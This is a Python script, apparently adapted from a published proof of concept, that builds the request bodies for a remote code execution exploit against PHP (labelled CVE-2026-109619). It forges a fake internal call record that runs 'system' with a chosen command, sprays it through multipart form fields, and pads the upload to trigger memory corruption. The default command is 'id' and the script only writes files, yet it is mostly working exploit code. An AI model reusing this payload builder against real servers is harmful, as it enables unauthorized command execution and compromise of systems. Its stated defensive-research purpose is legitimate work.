#!/usr/bin/env python3

"""producer_619.py - CVE-2026-109619 producer shape.

Adapted from `poc1_109619.py` in the PHP-UP-2026 bundle by J4ck3LSyN, with
PoCs by Andrew Dorman / @acd421; published at
https://jackalsyn.com/posts/php-up-2026.html and mirrored at
cereZ23/php-up-2026, commit c63f145596dbe9cdd437d24ed2418f0c1e59bcc2.

That bundle states no open-source license and is marked "Authorized
defensive-research / scoped-engagement use only." This file is an adaptation,
not a relicensing: the repository's AGPL-3.0 does not apply to the upstream
material and grants no rights the authors did not grant. See
THIRD_PARTY_NOTICES.md.

Inert forge default: build(sid, cmd, call) -> (phase1, tail).
"""

import struct
import sys

FILL = 5120
N149 = 149
BLOB = 288
BOUND = b"B7kQpoc619"
USAGE = """usage: producer_619.py <sid> <out-prefix>

Build the CVE-2026-109619 phase1/tail shapes and write <out-prefix>.phase1 and
<out-prefix>.tail. Use --help to show this message."""


def forge(call: int, cmd: bytes) -> bytes:
    rec = bytearray(BLOB)
    struct.pack_into("<Q", rec, 0, 64)          # FCI
    struct.pack_into("<Q", rec, 8, call)
    struct.pack_into("<I", rec, 16, 0x106)      # IS_STRING_EX
    struct.pack_into("<I", rec, 48, 1)          # param_count
    struct.pack_into("<B", rec, 64, 1)          # ZEND_INTERNAL
    struct.pack_into("<Q", rec, 64 + 88, call)
    struct.pack_into("<I", rec, 160, 0x308)     # IS_OBJECT_EX
    sysb = b"system\x00" + cmd + b"\x00"
    rec[200:200 + len(sysb)] = sysb[:80]
    return bytes(rec)


def part(b, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + b + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build(sid: str, cmd: bytes, call: int):
    spray = forge(call, cmd)
    assert BOUND not in spray
    pre = part(BOUND, "PHPSESSID", sid.encode()) + b"\r\n"
    pre += part(BOUND, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    for _ in range(N149):
        pre += part(BOUND, "t[]", spray) + b"\r\n"
    pre += part(BOUND, "f", b"", filename="a") + b"\r\n"
    phase1 = pre + b"A" * (FILL + 64)
    tail = b"B" * (FILL + 64) + b"C" * (FILL + 64) + b"\r\n--" + BOUND + b"--\r\n"
    return phase1, tail


if __name__ == "__main__":
    argv = sys.argv[1:]
    if any(arg in ("-h", "--help") for arg in argv):
        print(USAGE)
        raise SystemExit(0)
    if len(argv) != 2:
        print(USAGE, file=sys.stderr)
        raise SystemExit(2)
    sid, out_prefix = argv
    cmd = "id"
    p1, t = build(sid, cmd.encode(), 0)
    sys.stdout.write(f"phase1={len(p1)} tail={len(t)}\n")
    with open(out_prefix + ".phase1", "wb") as f:
        f.write(p1)
    with open(out_prefix + ".tail", "wb") as f:
        f.write(t)
